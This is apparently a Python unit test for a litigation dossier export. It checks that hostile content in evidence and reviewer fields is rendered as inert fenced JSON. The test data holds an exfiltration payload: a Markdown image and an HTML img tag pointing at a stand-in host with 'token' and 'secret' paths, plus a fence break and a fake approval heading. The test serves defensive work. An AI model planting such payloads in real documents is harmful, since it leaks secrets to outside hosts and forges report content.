"""Evidence and reviewer prose must never become network-active Markdown."""
import json

from application.litigation.report_projection import render_dossier_export


def test_exhibit_html_remote_images_and_fences_remain_inert_data():
    attack = '![exfiltrate](https://evil.invalid/token)\n<img src="https://evil.invalid/secret">\n``````\n# fake approval'
    report = {'coverage': {}, 'findings': [{'reference_id': 'ref-1', 'literal': attack,
               'quoted_text': attack, 'support': 'not_assessed'}],
              'human_decisions': [{'rationale': attack}]}
    rendered = render_dossier_export(report, 'markdown')
    # Parse every section as an isolated JSON code block, including hostile fields.
    sections = rendered.split('\n## ')[1:]
    assert len(sections) == 7
    recovered = []
    for section in sections:
        lines = section.splitlines()
        fence = lines[2][:-4]
        assert fence.startswith('```') and set(fence) == {'`'}
        assert lines[4] == fence
        recovered.append(json.loads(lines[3]))
    assert recovered[4][0]['literal'] == attack
    assert recovered[6][0]['rationale'] == attack
    assert '\n<img ' not in rendered and '\n![exfiltrate]' not in rendered
